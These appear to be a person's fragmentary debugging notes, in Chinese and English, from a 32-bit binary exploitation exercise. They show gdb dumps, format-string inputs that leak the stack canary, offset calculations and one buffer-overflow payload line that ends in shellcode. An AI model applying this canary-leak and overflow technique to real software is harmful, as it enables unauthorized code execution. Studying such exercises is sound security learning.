EAX: 0x9b46c00  canary



0xfffb43fc



0xfffb4380





EAX: 0xa01ec100 canary



0xffa3f50c:	0xa01ec100







EAX: 0x5243de00







main ret

0004| 0xffffd5ec --> 0xf7e15637



main canary

EAX: 0x3c48ec00



canary addr

0xffffd5dc



0024| 0xffffd578 ("%31$x")



getmessge canary

EAX: 0x3c48ec00



getmes canary addr

0xffffd54c:	0x3c48ec00



canary一样

mov    eax,gs:0x14



0000| 0xffffd4d0 --> 0xffffd578 ("%31$x")



getmess ret addr

0000| 0xffffd55c --> 0x8048577 (<main+90>:



泄漏canary之后，返回函数重新执行一遍











ret addr

0000| 0xffffd55c --> 0x8048577



0x10=16



canary

0xffffd54c



0x64=100



0xffffd4e8

0000| 0xffffd4d0 --> 0xffffd4e8 ('A' <repeats 68 times>)





ret addr

0000| 0xffffd55c --> 0x8048577 (<main+90>:





0xffffd55c-0xffffd558+0xc=0x10

开头需要填充canary 结尾需要填充返回地址，所以需要减去4，距离为12





栈开始的地方

ESP: 0xffffd558 --> 0xffffd5e8 --> 0x0



EAX: 0x2df0a800





stack_start

ESP: 0xff8942f8



canary

EAX: 0xb9c35300







EBP: 0xffa43d58 --> 0xffa43de8 --> 0x0



输入字符串，存储的地方

0008| 0xffa43d60 --> 0xffa43d78 ("AAAABBBB %31$p %34$p")







get-message push ebp; mov ebp,esp

EBP: 0xffe88238 --> 0xffe882c8（main函数的ebp地址）





0012| 0xffe881bc --> 0xffe88258 ("%31$p.%34$p")

        0xffe88240	   0xffe88258



0xffe88240是main函数栈中保存printf输入字符串的地址，在getmessage函数中也有几处，但是退出message函数就会



main的ebp

EBP: 0xffffd498 --> 0x0



canary: 0xffffd48c

0xffffd410 --> 0xffffd428 ("AAAA")



main的canary离字符串距离为 0x7c=124个地址 ，shellcode不能超过124个地址





问题：

最后shellcode会不会覆盖main的canary



payload = 'a'*100 + p32(int(canary,16)) + 'a'*12 + p32(shellcode_addr) + shellcode + shellcode + shellcode







shellcode无论多长也不影响，因为没有执行到main的ret语句，main函数能不能正确返回无所谓，所以覆盖了main栈中的canary也没事